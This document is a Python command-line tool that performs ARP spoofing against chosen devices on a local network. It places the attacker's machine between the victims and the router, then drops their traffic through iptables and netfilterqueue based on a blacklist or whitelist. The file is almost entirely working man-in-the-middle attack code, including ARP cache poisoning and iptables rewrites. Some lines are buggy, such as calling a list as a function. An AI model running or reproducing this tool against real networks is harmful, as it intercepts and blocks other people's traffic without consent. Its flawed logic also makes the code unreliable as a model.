#!/usr/bin/env python3

import scapy.all as scapy
from time import sleep
import requests
import netfilterqueue
import subprocess
import multiprocessing
import socket
import argparse

flags = argparse.ArgumentParser() # to get arguments from command line

flags.add_argument("-b","--blacklist", help="File with hostnames/IP to black listing",
                   default=None, type=str) # black list file path
flags.add_argument("-w","--whitelist", help="File with hostnames/IP to white listing",
                   default=None, type=str) # white list file path
flags.add_argument("-c","--count", type=int, default=1, help="to select no.of devices (default 1)") # no.of devices to spoof

arguments = flags.parse_args()


def enable_ipforwarding(): # to enable ip forwarding
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:  # enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def scan(ip): # to scan the network and get ip and mac address of devices in the network using ARP request and response 
    arp_request = scapy.ARP()
    arp_request.pdst = ip
    ip_mac_address_list = {}
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # broadcast mac address

    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=2, verbose=False)[0] # send ARP request and get ARP response

    for element in answered_list: # get ip and mac address of devices in the network
        ip_mac_address_list[element[1].psrc] = element[1].hwsrc

    return ip_mac_address_list


def spoof(target_ip, target_mac, spoof_ip): # to send ARP response to the target device and router to make them think that we are the router and the router think that we are the target device
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # ARP response packet to the target device
    scapy.send(packet, verbose=False) # sending the packet


def spoof_devices(): # spoofing the devices which we selected

    while 1:
        for ii in devices_index:

            spoof(device_ips[ii-1], ips_to_macs[device_ips[ii-1]], router_ip) # spoof the target device
            spoof(router_ip, ips_to_macs[router_ip], device_ips[ii-1]) # spoof the router

        sleep(0.5)


def get_ip_by_host(host_name): # to get ip address of the host name ex: google.com --> xx.xx.xx.xx
    return socket.gethostbyname(host_name) 


def ip_address_list(file_name): # to get ip address list from the file 

    ips_list = []
    host_list = {}
    try:
        f = open(file_name, "r")
        for elm in f:
            line = elm.replace("\n", "")
            if line[0] == "@": # host name
                host_list[line[1::1]] = line
                ips_list.append(line[1::1])
            elif line[0] == "#": # comment
                continue
            else: # ip address
                ip_addr = get_ip_by_host(line)
                host_list[ip_addr] = line
                ips_list.append(ip_addr)
        f.close()
    except:
       print("""\033[91m[-] Host address not found or File not found\033[00m""")
       f.close()
       exit(1)
    return ips_list, host_list


def process_packet_black_list(packet): # to process the packet and drop the packet if the packet is from or to the black list ip address

    scapy_packet = scapy.IP(packet.get_payload())
    if ((scapy_packet[scapy.IP].dst in black_list) or (scapy_packet[scapy.IP].src in black_list)): # check if the packet is from or to the black list ip address
        packet.drop()

        print("\r", end=" "*40)
        try:
            print(f"\r[*] recently blocked : {black_list_host[scapy_packet[scapy.IP].dst]}", end="")
        except:
            print(f"\r[*] recently blocked : {black_list_host[scapy_packet[scapy.IP].src]}", end="")

    else:
        packet.accept()


def process_packet_white_list(packet): # to process the packet and drop the packet if the packet is not from or to the white list ip address

    scapy_packet = scapy.IP(packet.get_payload())
    if ((scapy_packet[scapy.IP].dst in white_list) or (scapy_packet[scapy.IP].src in white_list)): # check if the packet is from or to the white list ip address
        packet.accept()

    else:
        print("\r", end=" "*40)
        packet.drop() # drop the packet if the packet is not from or to the white list ip address
        print(
            f"\r[*] recently blocked: {scapy_packet[scapy.IP].src} --> {scapy_packet[scapy.IP].dst}", end="")


def traffic_analyzer(process_packet): # to analyze the traffic and drop the packet if the packet is not from or to the white list ip address
    subprocess.call("sudo iptables --flush FORWARD", shell=True)

    subprocess.call(
        "sudo iptables --append FORWARD -j NFQUEUE --queue-num 6", shell=True)
    traffic_queue = netfilterqueue.NetfilterQueue()
    traffic_queue.bind(6, process_packet)
    traffic_queue.run()


enable_ipforwarding() # enable ip forwarding

router_ip = scapy.conf.route.route("0.0.0.0")[2] # get router ip address


if router_ip[-1:-3:-1] == "1.": # check if the router ip address is valid
    print(router_ip[0:len(router_ip)-1:1]+"1/24")
    ips_to_macs = scan(router_ip[0:len(router_ip)-1:1]+"1/24") # scan the network

else:
    print("""\033[91m [-] can't do ARP spoof to this network
    try again connecting to router or access point \033[00m""")
    exit(0)

SoNo = 0
device_ips = []
devices_index = []

for elm in ips_to_macs:
    SoNo = SoNo+1
    print(f"[{SoNo}]\033[96m {elm}", end=" has mac: ")
    print(ips_to_macs[elm], end=" vender= ")

    print((requests.get("https://api.macvendors.com/" +
          ips_to_macs[elm])).content.decode(), end="\033[00m \n")
    device_ips.append(elm)

no_of_devices = arguments.count

if ((no_of_devices > 0) and (SoNo > 1)): # to select the devices to spoof 
    for ii in range(no_of_devices):
        devices_index.append(
            int(input(f"\033[92m[?] Select the device {ii+1} >> \033[00m")))
elif ((no_of_devices == -1) and (SoNo > 1)): # to select all devices to spoof except router
    for ii in range(SoNo):
        if device_ips(SoNo-1) != router_ip:
            devices_index.append(ii)
else: # if there is no devices to spoof
    print("\033[91m [!] not enough nodes found\033[00m")
    exit(1)

print("\033c")  #just to clear screen

if arguments.blacklist != None: # to get black list ip address list if the user pass the black list file path
    black_list, black_list_host = ip_address_list(arguments.blacklist)

elif arguments.whitelist != None: # to get white list ip address list if the user pass the white list file path
    white_list, _ = ip_address_list(arguments.whitelist)
    white_list = white_list + device_ips



try:

    process_spoof_devices = multiprocessing.Process(target=spoof_devices) # starting a background process to spoof the devices which we selected

    if arguments.blacklist != None:
        process_traffic_analyzer = multiprocessing.Process(
            target=traffic_analyzer, args=(process_packet_black_list,)) # starting a background process to analyze the traffic and drop the packet if the packet is from or to the black list ip address

    elif arguments.whitelist != None:
        process_traffic_analyzer = multiprocessing.Process(
            target=traffic_analyzer, args=(process_packet_white_list,)) # starting a background process to analyze the traffic and drop the packet if the packet is not from or to the white list ip address

    process_spoof_devices.start()

    process_traffic_analyzer.start()

except KeyboardInterrupt: # to stop the program if the user press ctrl+c
    process_spoof_devices.terminate() # stop spoofing
    process_traffic_analyzer.terminate() # stop traffic analyzing
    subprocess.call("sudo iptables --flush FORWARD", shell=True) # reset iptables rules to default
